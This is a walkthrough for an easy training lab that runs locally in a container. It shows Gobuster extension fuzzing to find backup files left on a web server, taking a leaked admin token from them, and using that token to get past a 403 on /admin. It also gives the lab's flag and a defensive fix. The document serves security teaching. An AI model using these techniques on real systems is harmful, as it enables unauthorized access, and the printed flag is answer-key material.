# Level 2: Extension Fuzzing & Sensitive Backup Exposure

## Overview
- **Track**: Offensive Security (Red Team)
- **Difficulty**: Easy
- **Category**: File Extension Fuzzing, Sensitive Data Exposure, Authentication Bypass
- **Estimated Time**: 25 minutes

---

## Background & Scenario

> *"Following your previous breach, the culinary portal team hardened their `/admin` portal with token-based authentication. Direct requests now return a strict `403 Forbidden`.*
>
> *However, developers working under tight deadlines frequently make mistakes. They leave database dumps, temporary notes, or backup files in the web root (e.g., `config.bak`, `secret.txt`, `.env`). These files are not linked anywhere on the homepage, making them invisible to standard browsing."*

---

## Lab Objectives

1. Start the Level 2 container target using Podman.
2. Confirm the `/admin` portal returns `403 Forbidden`.
3. Use **Gobuster's `-x` flag** to fuzz for sensitive file extensions (`.bak`, `.txt`, `.json`).
4. Read the leaked developer files and extract the hidden administrative token.
5. Bypass the 403 authorization barrier and capture **Flag 2**.

---

## How to Run This Lab

### Option 1: From the Repository Root
```bash
./start-lab.sh 2
```

### Option 2: Manually with Podman
```bash
cd offensive/level-02-extension-fuzzing
podman build -t offensive-level-2 .
podman run -d --name offensive-lab -p 8080:8080 localhost/offensive-level-2
```

---

## Attack Walkthrough

### Step 1: Probe the Locked Endpoint
Test direct access to the administrative endpoint:
```bash
curl -i http://127.0.0.1:8080/admin
```
*Expected Result: You receive an `HTTP/1.0 403 Forbidden` response.*

### Step 2: Extension Fuzzing with Gobuster
Standard directory brute-forcing only tests plain wordlist entries. To find file copies and notes, tell Gobuster to append extensions using `-x`:
```bash
gobuster dir -u http://127.0.0.1:8080 -w /home/chaleeblack/common.txt -x bak,txt,json
```

Discovered endpoints with `Status: 200`:
- `/config.bak`
- `/secret.txt`
- `/notes.txt`

### Step 3: Extract Leaked Credentials
Inspect the leaked files:
```bash
curl http://127.0.0.1:8080/config.bak
curl http://127.0.0.1:8080/secret.txt
```
*Notice: The developer notes reveal the secret token `master_chef_token_2026` and how to pass it via URL query parameter or HTTP header.*

### Step 4: Authentication Bypass & Exploitation
Pass the token to the protected `/admin` endpoint:

**Method A (URL Parameter):**
```bash
curl -s "http://127.0.0.1:8080/admin?token=master_chef_token_2026"
```

**Method B (HTTP Header):**
```bash
curl -s -H "X-Admin-Token: master_chef_token_2026" http://127.0.0.1:8080/admin
```

---

## Challenge Solution
<details>
<summary>Click to view Flag & Key Takeaway</summary>

- **Flag**: `Flag{fuzzing_extensions_revealed_the_keys_to_the_kitchen}`
- **Offensive Takeaway**: When direct paths are blocked by 403 or 401, fuzz for backup and temporary files (`.bak`, `.old`, `.swp`, `.zip`, `.env`).
- **Defensive Fix**: Never store sensitive credentials in plaintext, and ensure web servers block public access to backup file extensions in production.
</details>

---

## Clean Up
```bash
./stop-lab.sh
```
